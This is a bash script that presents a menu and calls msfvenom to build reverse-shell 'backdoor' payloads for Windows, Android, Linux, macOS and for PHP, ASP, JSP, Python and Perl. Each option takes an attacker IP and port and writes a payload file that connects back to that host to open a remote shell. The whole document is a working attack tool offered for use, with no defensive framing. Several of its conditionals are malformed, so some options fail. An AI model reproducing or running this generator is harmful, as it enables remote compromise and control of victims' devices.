clear
figlet 'Shell Script'

echo ''                             
echo ' 1 - Shell exe'                       
echo ' 2 - Shell apk'                         
echo ' 3 - Shell bash'
echo ' 4 - Shell linux'
echo ' 5 - Shell mac' 
echo ' 6 - Shell php'
echo ' 7 - Shell asp'
echo ' 8 - Shell jsp'
echo ' 9 - Shell war'
echo ' 10 - Shell python'
echo ' 11 - Shell perl'                  

read -p "Choose an option: " value
echo ''
read -p "Enter the local or external IP: " ip
read -p "Enter a port: " porta
read -p "Enter the backdoor name: " backdoor

if [ $value == "1" ] ; then
    clear
    echo "Creating backdoor => $backdoor.exe"
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f exe > $backdoor.exe
    
    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"
    fi

elif [ $value == "2" ] ; then
    clear
    echo "Creating backdoor => $backdoor.apk"
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta R > $backdoor.apk

    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"
    fi

elif [ $value == '3' ] ; then
    clear
    echo "Creating backdoor => $backdoor.sh"
    msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$porta -f raw > $backdoor.sh

    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"

    fi

elif [ $value == '4']; then
    clear
    echo "Creating backdoor => $backdoor.elf"
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f elf > $backdoor.elf

    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"

    fi

elif [ $value == '5']; then
    clear
    echo "Creating backdoor => $backdoor.macho"
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$porta -f macho > $backdoor.macho

    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"

    fi

elif [ $value == '6']; then
    clear
    echo "Creating backdoor => $backdoor.php"
    msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$porta -f raw > $backdoor.php

    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"

    fi

elif [ $value == '7']; then
    clear
    echo "Creating backdoor => $backdoor.asp"
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f asp > $backdoor.asp

    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"

    fi

elif [ $value == '8']; then
    clear
    echo "Creating backdoor => $backdoor.jsp"
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$porta -f raw > $backdoor.jsp

    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"

    fi

elif [ $value == '9']; then
    clear
    echo "Creating backdoor => $backdoor.war"
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$porta -f raw > $backdoor.war

    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"

    fi

elif [ $value == '10']; then
    clear
    echo "Creating backdoor => $backdoor.py"
    msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$porta -f raw > $backdoor.py

    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"

    fi

elif [ $value == '11']; then
    clear
    echo "Creating backdoor => $backdoor.pl"
    msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$porta -f raw > $backdoor.pl

    exe=`ls | grep $backdoor`
    if [ $? == 0 ] ; then
        clear
        echo "Successfully created!!!"
        echo $exe
    else
        echo "Error, try to run again"

    fi
fi